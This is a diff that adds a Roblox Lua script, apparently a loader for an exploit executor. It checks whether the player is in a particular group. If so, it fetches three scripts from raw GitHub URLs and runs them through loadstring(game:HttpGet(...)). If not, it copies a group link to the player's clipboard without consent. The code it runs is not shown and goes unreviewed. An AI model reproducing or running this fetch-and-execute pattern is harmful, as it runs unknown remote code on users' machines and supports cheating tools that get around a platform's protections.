@@ -1,0 +1,25 @@
+wait(10)
+local lc = game:GetService("Players").LocalPlayer 
+local group = 14323051
+local grouplink = "https://www.roblox.com/groups/14323051/r-m#!/about"
+
+
+if lc:IsInGroup(group) then 
+      game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Made by zzotac";
+		Text = "Whitelisted ";
+	})
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/oppswisser/DOAK/main/sw'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/oppswisser/DOAK/main/swissbeam'))()
+	wait(1)
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/oppswisser/DOAK/main/is'))()
+else
+      
+      setclipboard(grouplink)
+       game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Made by zzotac";
+		Text = " not whitelisted ,group link copied to clip board.";
+	})
+end
+
+
